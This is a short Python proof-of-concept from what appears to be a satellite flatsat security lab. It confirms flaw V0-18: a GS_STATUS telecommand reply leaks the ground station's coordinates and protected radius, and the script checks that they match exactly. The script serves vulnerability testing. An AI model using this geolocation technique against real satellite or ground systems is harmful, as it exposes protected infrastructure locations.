#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

def main(dev, ev):
    # V0-18: GS_STATUS telemetry publishes the ground station coordinates
    # and protected radius. Passive listen -> station geolocation.
    gs = dev.find(dev.tc(0x13, b"", via="usb"), 0x13)[0]
    lat = gs.le32s(13) / 1e7
    lon = gs.le32s(17) / 1e7
    rad = gs.le16(21)
    ev.log(f"leaked station: lat={lat:.4f} lon={lon:.4f} radius={rad} m")
    check(abs(lat - 36.1699) < 1e-4 and abs(lon + 115.1398) < 1e-4 and rad == 35000,
          "station coordinates must leak exactly")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-18 GS_STATUS leaks station position", main))
